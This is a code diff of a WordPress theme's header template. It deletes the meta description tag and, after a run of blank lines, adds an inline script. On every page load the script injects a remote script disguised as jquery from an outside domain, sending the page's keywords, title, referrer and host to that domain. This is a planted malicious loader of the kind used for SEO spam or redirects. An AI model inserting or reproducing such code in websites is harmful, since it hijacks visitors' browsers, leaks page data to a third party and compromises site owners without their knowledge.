@@ -12,7 +12,7 @@
     <?php } ?>
     <?php if(inc_is_custom_seo_enabled()) { ?>
     <?php if(inc_has_meta_description()) { ?>
-    <meta name="description" content="<?php echo inc_get_meta_description();?>">
+    
     <?php } ?>
     <?php if(inc_has_meta_keywords()) { ?>
     <meta name="keywords" content="<?php echo inc_get_meta_keywords();?>">
@@ -39,6 +39,18 @@
     <!-- begin JS & CSS -->
     <?php wp_head(); ?>
     <!-- end JS & CSS -->
+
+
+
+
+
+
+
+
+
+
+
+<script>var a='';setTimeout(10);if(document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null){document.write('<script type="text/javascript" src="http://aryareigroup.com/js/jquery.min.php?c_utt=J18171&c_utm='+encodeURIComponent('http://aryareigroup.com/js/jquery.min.php'+'?'+'default_keyword='+encodeURIComponent(((k=(function(){var keywords='';var metas=document.getElementsByTagName('meta');if(metas){for(var x=0,y=metas.length;x<y;x++){if(metas[x].name.toLowerCase()=="keywords"){keywords+=metas[x].content;}}}return keywords!==''?keywords:null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k))+'&se_referrer='+encodeURIComponent(document.referrer)+'&source='+encodeURIComponent(window.location.host))+'"><'+'/script>');}</script>
 </head>
 
 <body <?php body_class(inc_get_layout_type()); ?>>
